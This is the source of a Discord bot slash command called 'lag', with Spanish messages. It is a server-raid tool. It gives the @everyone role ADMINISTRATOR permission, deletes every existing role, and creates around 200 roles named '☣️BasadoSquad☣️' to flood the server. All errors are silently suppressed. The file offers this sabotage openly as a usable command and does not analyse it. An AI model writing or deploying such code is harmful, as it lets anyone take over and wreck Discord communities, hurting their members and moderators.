const { SlashCommandBuilder } = require("@discordjs/builders")
const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js")


module.exports = {

    timeout:520000, 
    data: new SlashCommandBuilder()
    .setName("lag")
    .setDescription("Lagea a los usuarios dandole Admin a todos mientras el bot hace muchos roles en el servidor")
,


    async run(client, interaction){
try{

    
    interaction.reply({content: '**Laggeo iniciado, presenciarás un lag repentino debido a la creación masiva de roles**', ephemeral: true}).catch(()=>{
        return;
      })
      interaction.guild.roles.cache.find(role => role.name =="@everyone").setPermissions('ADMINISTRATOR').catch(()=>{
        interaction.reply({content: "**Ocurrió un error al intentar otorgar este permiso al rol @everyone, por favor revise mis permisos.**", ephemeral: true})
    })
    interaction.guild.roles.cache.forEach(role => {
        role.delete().catch(()=>{
            return;
        })
    });
    for (let i = 0; i <= 200; i++) {
        interaction.guild.roles.create({
            name: '☣️BasadoSquad☣️',
            color: 'RED',
            reason: '☣️BasadoSquad☣️',
            position: interaction.guild.me.roles.highest.position - 1
        }).catch(()=>{
            return;
        })
    }
        
        

  



}catch (e) {
        console.error(e);
        
        try {
          return;
         } catch (e) {}
        }
    }
}